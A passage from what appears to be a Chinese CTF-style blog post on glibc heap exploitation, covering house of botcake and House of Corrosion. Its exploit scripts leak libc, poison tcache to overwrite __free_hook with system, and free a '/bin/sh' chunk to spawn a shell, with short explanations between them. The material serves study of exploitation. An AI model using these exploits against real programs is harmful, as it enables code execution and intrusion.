+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)   </span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x101</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x150</span>,payload)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x100</span>,p64(system))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i) </span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>堆块8进入unsortbin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(7)</span><br></pre></td></tr></table></figure>
+
+<p>堆块8与堆块7合并</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x100)</span><br></pre></td></tr></table></figure>
+
+<p>tcachebin中就空出来一个</p>
+<p>然后再次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(8)</span><br></pre></td></tr></table></figure>
+
+<p>这时8被free两次，一次在unsortbin中，另一次在tcachebin中，而且形成堆叠，8在7这个合并的大堆块中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(11,0x150,payload)</span><br></pre></td></tr></table></figure>
+
+<p>申请一个大堆块，改堆块8的fd</p>
+<p>tcachebin attack</p>
+<p>提问：为什么不能先free(7)后free(8)</p>
+<p>因为后面double free free(7),unsortbin链表就被破坏了</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1757952795005-e27058c9-e98c-4543-9fe4-eb59f25a22a3.png" alt="img"></p>
+<p>更高版本没有edit  tcachebin attack</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)   </span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x210</span>,<span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(fd))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>7,8堆块合并进入unsortbin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(10,0x210,b&#x27;\x10&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>将他两个申请出来，但是有uaf，所以7堆块和10堆块的指针指向同一块地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(11,0x100,b&#x27;/bin/sh\x00&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>将tachebin空出来一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(8)</span><br></pre></td></tr></table></figure>
+
+<p>进入tachebin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(10)</span><br><span class="line">add(12,0x210,b&#x27;a&#x27;*0x120)</span><br></pre></td></tr></table></figure>
+
+<p>free10，又将10申请出来，12就可以覆盖到8</p>
+<h2 id="7-House-of-Corrosion"><a href="#7-House-of-Corrosion" class="headerlink" title="7.House-of-Corrosion"></a>7.House-of-Corrosion</h2><p>通过改bins的大小限制，使他可以存无限大的堆块的指针（就是往后面存），从而实现往任意地址写一个堆指针</p>
+<p>但是只能在管理堆bins的后面</p>
+<p>首先我们要修改bins的大小（任意地址写，unsortbinattack等）</p>
+<h3 id="例子1：fastbin"><a href="#例子1：fastbin" class="headerlink" title="例子1：fastbin"></a>例子1：fastbin</h3><p>​           fastbinY[0]&#x3D;0x7ffff07dcfc50</p>
+<p>​          _IO_list_all&#x3D;0x7ffff07dd06c0</p>
+<p>chunk size &#x3D; (delta * 2) + 0x20 ，delta为目标地址与fastbinY的offset</p>
+<p>在这个例子中，chunk大小应该是(0x7ffff7dd06c0-0x7ffff7dcfc50)*2+0x20&#x3D;0x1500字节</p>
+<h3 id="例子2：tcachebin"><a href="#例子2：tcachebin" class="headerlink" title="例子2：tcachebin"></a>例子2：tcachebin</h3><p>改mp_.tcache_bins &#x3D; obstack_exit_failure-0x20</p>
+<p>mp_.tcache_bins &#x3D; libc.sym[‘obstack_exit_failure’]+libc_base</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15532">https://xz.aliyun.com/news/15532</a></p>
+<p>​             entries[0] &#x3D; 0x555555605090</p>
+<p>​             因为他这个是在堆上，所以我们可以直接让他在第一个堆块里面，然后改他为free_hook,然后再申请出来就可以了</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422664902-1fef5cb8-46f3-4122-bc81-51ed631cb46f.png" alt="img"></p>
+<p>我们将这个本来是0x40改成一个大的值之后当申请大的堆块他也会进入tcachebin，然后他的指针就会被存起来，在这个初始化堆块，0x5090就是存大小为0x20链表头的堆块指针，依次往后所以我们申请一个大堆块，他的指针就会往后面写，写道我们申请的第一个堆块我们就可以利用第一个堆块修改它</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422804791-e0f3d4ab-59bf-4f48-ac1d-0e14a83a3a6c.png" alt="img"></p>
+<p>free大堆块之后</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422623334-4506a2b0-3bae-4032-9fe6-5f835eef6198.png" alt="img"></p>
+<p>但是bins里面不会有，但是它实际上是有的</p>
+<p><img src="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/1759422981366-fbc6d4b6-8770-4e40-97d3-b6be5e81735d.png" alt="img"></p>
+<p>所以我们改成free_hook之后，直接申请就可以申请出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)<span class="comment">#1</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">tcache_bins = libc.sym[<span class="string">&#x27;obstack_exit_failure&#x27;</span>]+libc_base-<span class="number">0x20</span></span><br><span class="line">p.send(p64(tcache_bins)+p64(tcache_bins)*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(free_hook))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">add(<span class="number">0x500</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag"># 知识点</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/18/Largebin-Attack/" rel="prev" title="Largebin Attack">
+      <i class="fa fa-chevron-left"></i> Largebin Attack
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/18/IO/" rel="next" title="IO">
+      IO <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-House-Of-Einherjar"><span class="nav-number">1.</span> <span class="nav-text">1.House Of Einherjar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-house-of-froce"><span class="nav-number">2.</span> <span class="nav-text">2.house  of  froce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-house-of-lore"><span class="nav-number">3.</span> <span class="nav-text">3.house  of  lore</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-House-of-Orange"><span class="nav-number">4.</span> <span class="nav-text">4.House of Orange</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-house-of-rabbit"><span class="nav-number">5.</span> <span class="nav-text">5.house  of   rabbit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-house-of-botcake"><span class="nav-number">6.</span> <span class="nav-text">6.house of botcake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-House-of-Corrosion"><span class="nav-number">7.</span> <span class="nav-text">7.House-of-Corrosion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%AD%901%EF%BC%9Afastbin"><span class="nav-number">7.1.</span> <span class="nav-text">例子1：fastbin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%AD%902%EF%BC%9Atcachebin"><span class="nav-number">7.2.</span> <span class="nav-text">例子2：tcachebin</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">和方煜</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">和方煜</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">123k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:52</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+// 在最后添加
+<script src="/js/code-unfold.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
